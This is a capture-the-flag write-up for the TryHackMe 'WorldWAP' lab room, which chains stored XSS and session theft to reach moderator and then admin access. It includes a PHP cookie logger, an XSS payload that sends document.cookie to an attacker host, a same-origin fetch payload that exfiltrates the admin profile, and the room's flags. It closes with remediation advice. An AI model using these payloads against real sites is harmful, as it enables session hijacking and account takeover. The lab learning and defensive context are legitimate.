# WorldWAP — TryHackMe Writeup

**Category:** Client-Side Exploitation (Stored XSS · Cookie Theft · CORS/CSRF · Same-Origin Exfiltration)
**Goal:** Capture the moderator flag, then escalate to the admin panel.

> *"Never click on links received from unknown sources. Can you capture the flags and get admin access to the web app?"*

---

## 1. Recon

Add the host and scan:

```bash
echo "<MACHINE_IP> worldwap.thm login.worldwap.thm" | sudo tee -a /etc/hosts
nmap -sV -T4 worldwap.thm
```

```
22/tcp   open  ssh
80/tcp   open  http   Apache 2.4.41
8081/tcp open  http   Apache 2.4.41
```

The app lives at `http://worldwap.thm/public/html/`. It offers **Register**, and logging in requires visiting `login.worldwap.thm`.

Reading the client-side source reveals the key logic.

**`login.js`** — role decides the landing page:
```js
window.location.href = data.role == 'moderator' ? 'admin.php' : 'dashboard.php';
```

**`register.php`** — *"Your details will be reviewed by the site moderator"* and includes a **Name** field. The registration is sent to `../../api/register.php` with a static header:
```
X-THM-API-Key: e8d25b4208b80008a9e15c8698640e85
```

A field that a **moderator reviews in their browser** is a classic **stored XSS** sink.

---

## 2. Stored XSS → Stealing the Moderator Session

Set up a cookie logger on the attacker box (Apache runs on port 80):

```php
// /var/www/html/c.php
<?php
file_put_contents('/var/www/html/cookies.txt',
  date('H:i:s')." ".$_SERVER['REMOTE_ADDR']." ".($_GET['c']??'')."\n", FILE_APPEND);
echo "ok";
?>
```

Register with a JavaScript payload in the **Name** field, pointed at our logger:

```bash
curl -s -X POST http://worldwap.thm/api/register.php \
  -H "Content-Type: application/json" \
  -H "X-THM-API-Key: e8d25b4208b80008a9e15c8698640e85" \
  -d '{"username":"atk","password":"Pass123!","email":"a@a.com",
       "name":"<script>new Image().src=\"http://<ATTACKER_IP>/c.php?c=\"+document.cookie</script>"}'
```

The moderator bot reviews pending registrations on a timer. Each review fires our payload and leaks the moderator's session:

```
08:13:14 <MACHINE_IP> PHPSESSID=jld39pmi0iifoiimt2b3e53dhn
```

The `PHPSESSID` cookie is **not HttpOnly**, so `document.cookie` captures it.

---

## 3. Flag 1 — Moderator Account

The stolen session is valid across the whole site, including `login.worldwap.thm`. Requesting the moderator's profile reveals the first flag:

```bash
SID=<stolen_PHPSESSID>
curl -s -b "PHPSESSID=$SID" http://login.worldwap.thm/profile.php
```

```html
Welcome, Moderator  <b style='color: red'>Flag value: ModP@wnEd</b>
...
<span>Admin Area (You dont have the access !)</span>
```

**Flag 1: `ModP@wnEd`**

The profile also hints that an **Admin Area** exists that the moderator cannot reach — our next target.

---

## 4. Escalating to Admin via the Chat

`login.worldwap.thm` is a chat application. Key findings:

- An **Admin Bot (Online)** is present in the chat.
- Messages are rendered unsafely:
  ```js
  messageDiv.innerHTML = msg.message;   // stored XSS sink
  ```
- `change_password.php` has **no CSRF token**.
- A **"Reset/Move Admin Bot to chat.php"** button (`block.php`) forces the bot to load the chat and read new messages.

So any message we send is rendered inside the **Admin Bot's browser** — stored XSS in the admin's context.

### Exfiltration problem → same-origin trick

A naive cookie-stealer (`<img onerror=...document.cookie>` to an external host) produced **no callback** — external requests were blocked (CSP / bot behaviour), and the admin session is likely HttpOnly anyway.

Instead of exfiltrating to an external server, have the XSS act **same-origin**: fetch the admin's own `profile.php` (which contains the admin flag) and **post it back into the chat** as a new message. We then simply read the chat.

Payload sent as a chat message:

```html
<img src=x onerror="fetch('profile.php')
  .then(r=>r.text())
  .then(t=>fetch('chat.php',{
     method:'POST',
     headers:{'Content-Type':'application/x-www-form-urlencoded'},
     body:'message='+encodeURIComponent(t)
  }))">
```

Send it and trigger the bot:

```bash
SID=<stolen_PHPSESSID>
curl -s -b "PHPSESSID=$SID" http://login.worldwap.thm/chat.php --data-urlencode "message@/tmp/pay.txt"
curl -s -b "PHPSESSID=$SID" http://login.worldwap.thm/block.php      # move bot to chat
```

---

## 5. Flag 2 — Admin Panel

After the bot reads the message, the XSS runs in its session, fetches the admin profile, and posts it back to the chat. We read it:

```bash
curl -s -b "PHPSESSID=$SID" \
  "http://login.worldwap.thm/fetch_messages.php?lastMessageTime=1970-01-01%2000:00:00" \
  | grep -oiE "Flag value:[^<]*"
```

```
Flag value: AdM!nP@wnEd
```

**Flag 2: `AdM!nP@wnEd`**

---

## 6. Summary

| Step | Technique |
|------|-----------|
| Register with payload in `name` | Stored XSS targeting the moderator |
| Moderator reviews registration | Payload fires → steals `PHPSESSID` (not HttpOnly) |
| Reuse session on `profile.php` | **Moderator flag** |
| Chat message rendered via `innerHTML` | Stored XSS in the Admin Bot's browser |
| External exfil blocked | **Same-origin** exfil: fetch `profile.php`, re-post into chat |
| Read chat messages | **Admin flag** |

## 7. Remediation

- **Output encoding:** never place user input into `innerHTML`; use `textContent` or encode HTML entities server-side.
- **Session cookies:** set `HttpOnly`, `Secure`, and a strict `SameSite`.
- **CSRF protection:** add unpredictable anti-CSRF tokens to state-changing actions like `change_password.php`.
- **Validate on the server:** client-side checks (disabled buttons, role redirects) are UX only — enforce authorization server-side.
- **Content Security Policy:** a strict CSP limits exfiltration, though same-origin abuse shows it is not a complete fix.

---

*Flags: `ModP@wnEd` · `AdM!nP@wnEd`*
